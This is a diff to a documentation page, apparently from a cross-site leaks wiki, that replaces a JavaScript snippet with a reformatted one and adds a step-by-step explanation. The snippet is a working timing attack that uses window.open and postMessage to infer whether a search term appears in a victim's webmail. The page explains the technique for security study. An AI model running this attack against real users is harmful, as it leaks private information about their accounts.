@@ -59,7 +59,10 @@ g.onerror = g.onload = ()=>{
 
 If a page sets [Framing Protections](https://TODO), an attacker can still measure a page full load (i.e including subresources) by navigating the victim with `window.open`.
 
-```javascript
+The snippet bellow shows how make this measurement.
+
+
+<!-- ```javascript
 let w=0, z=0, v=performance.now();
 onmessage=()=>{
   try{
@@ -74,8 +77,34 @@ onmessage=()=>{
 };
 postMessage('','*');
 w=open('//mail.com/search?q=foo');
-```
+``` -->
 
+{{< highlight javascript "linenos=table,linenostart=1" >}}
+let w = 0, end = 0, begin = 0;
+onmessage=()=>{
+  try{
+    if(w && w.document.cookie){
+      // still same origin
+    }
+    postMessage('','*');
+  }catch(e){
+    end = performance.now();
+    console.log('time to load was', end - begin);
+  }
+};
+postMessage('','*');
+begin = performance.now();
+w = open('//mail.com/search?q=foo');
+{{< / highlight >}}
+
+The snippet above shows how make this measurement and works as follows:
+
+1. The attacker creates an infinite loop of `postMessage` broadcasts to itself while opening a `window` to the target website (line 15, 2, 7). The clock is started (line 14).
+2. When the window is created, its location [will be `about:blank`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) until the target page fully loads. The window inherits cookies from the parent document (the attacker's origin).
+3. In the infinite loop, the logic clause (line 4) will be `true` while the opened window remains in `about:blank` as its document is still accessible from the attacker's origin.
+4. When the window finally loads, the location and context will change from `about:blank` to the target's origin.
+5. The attacker's origin won't have access to the document of the opened window as per Same-Origin Policy. When this occurs, the logic clause (line 4) will fail and throw a `DOMException`.
+6. The attacker catches the Exception and stops the clock. The timing difference can tell the attacker if the string `foo` was found between the victim's emails.
 
 ### Timeless Timing Attacks
 
